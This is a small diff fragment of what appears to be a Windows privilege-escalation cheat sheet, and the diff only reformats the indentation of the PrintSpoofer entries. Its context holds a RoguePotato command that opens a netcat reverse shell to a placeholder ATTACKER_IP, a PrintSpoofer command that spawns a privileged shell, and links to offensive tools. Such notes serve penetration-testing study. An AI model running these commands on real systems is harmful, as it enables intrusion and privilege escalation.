@@ -273,8 +273,8 @@ Usual files that may contain credentials:
 - *on target machine*
   - RoguePotato.exe -r ATTACKER_IP -e "nc64 -e cmd.exe ATTACKER_IP 4448" -l 9999
   
-  - PrintSpoofer: https://github.com/dievus/printspoofer / https://github.com/itm4n/PrintSpoofer
- - PrintSpoofer.exe -i -c cmd
+ - PrintSpoofer: https://github.com/dievus/printspoofer / https://github.com/itm4n/PrintSpoofer
+  - PrintSpoofer.exe -i -c cmd
   
 # Tools of the trade
   - WinPEAS https://github.com/carlospolop/PEASS-ng `uncover privilege escalation paths`
